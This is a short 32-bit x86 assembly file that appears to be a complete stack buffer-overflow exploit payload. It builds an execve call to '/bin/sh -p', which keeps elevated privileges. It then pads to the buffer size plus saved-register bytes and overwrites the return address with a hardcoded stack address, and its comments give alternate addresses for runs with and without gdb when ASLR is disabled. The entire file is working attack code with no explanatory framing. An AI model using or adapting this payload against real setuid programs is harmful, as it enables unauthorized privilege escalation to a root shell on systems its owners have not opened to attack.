[bits 32]

    ; substitute your own values
    ; these work on my system with ASLR disabled
    ;CMD equ 0xffffcdb0 ; gdb
    CMD equ 0xffffcb40 ; no gdb
    ;ENVIRON equ 0xffffcf20 ; gdb
    ;ENVIRON equ 0xffffcf6c ; no gdb
    BUFSIZE equ 64

    ;int3
    ;mov eax, 1
    ;mov ebx, 7
    ;int 0x80
    ;int3
    mov eax, 0x0B
    mov ebx, CMD + argv0
    mov ecx, CMD + argv
    ;mov edx, ENVIRON
    mov edx, 0
    mov esi, 0
    int 0x80

argv0:
    db '/bin/sh', 0
argv1:
    db '-p', 0
argv:
    dd CMD + argv0
    dd CMD + argv1
    dd 0

    times (BUFSIZE - $ + $$ + 8 + 4) db 0
    dd CMD
